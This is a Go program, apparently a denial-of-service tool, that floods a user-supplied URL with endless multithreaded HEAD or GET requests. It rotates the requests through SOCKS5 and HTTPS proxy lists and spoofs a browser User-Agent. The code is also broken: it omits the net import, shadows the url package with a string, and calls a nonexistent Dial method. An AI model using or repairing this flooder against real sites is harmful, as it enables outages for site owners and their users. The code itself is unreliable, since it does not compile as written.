package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"

	"golang.org/x/net/proxy"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter HTTP method (HEAD or GET): ")
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))

	fmt.Print("Enter URL: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	// Read SOCKS5 proxies from file
	socks5Bytes, _ := ioutil.ReadFile("socks5.txt")
	socks5Proxies := strings.Split(strings.TrimSpace(string(socks5Bytes)), "\n")
	if len(socks5Proxies) == 1 && socks5Proxies[0] == "" {
		socks5Proxies = []string{}
	}

	// Read HTTPS proxies from file
	httpsBytes, _ := ioutil.ReadFile("https.txt")
	httpsProxies := strings.Split(strings.TrimSpace(string(httpsBytes)), "\n")
	if len(httpsProxies) == 1 && httpsProxies[0] == "" {
		httpsProxies = []string{}
	}

	// Combine both lists of proxies
	proxies := append(socks5Proxies, httpsProxies...)

	var wg sync.WaitGroup
	wg.Add(numThreads)

	for i := 0; i < numThreads; i++ {
		go func(i int) {
			defer wg.Done()

			for {
				proxyStr := proxies[i%len(proxies)]

				var dialFunc func(network, addr string) (c net.Conn, err error)
				if i < len(socks5Proxies) { // This is a SOCKS5 proxy
					dialer, _ := proxy.SOCKS5("tcp", proxyStr, nil, proxy.Direct)
					dialFunc = dialer.Dial
				} else { // This is an HTTPS proxy
					proxyUrl, _ := url.Parse("http://" + proxyStr)
					dialFunc = func(network, addr string) (net.Conn, error) {
						proxy, _ := http.ProxyFromEnvironment(&http.Request{URL: proxyUrl})
						return proxy.Dial(network, addr)
					}
				}

				httpTransport := &http.Transport{Dial: dialFunc}
				client := &http.Client{Transport: httpTransport}

				req, _ := http.NewRequest(method, url, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")

				_, err := client.Do(req)
				if err != nil {
					fmt.Printf("Proxy %s disconnected, error: %s\n", proxyStr, err)
					// Change to a different proxy
					proxyStr = proxies[(i+1)%len(proxies)]
					continue
				}
			}
		}(i)
	}

	wg.Wait()
}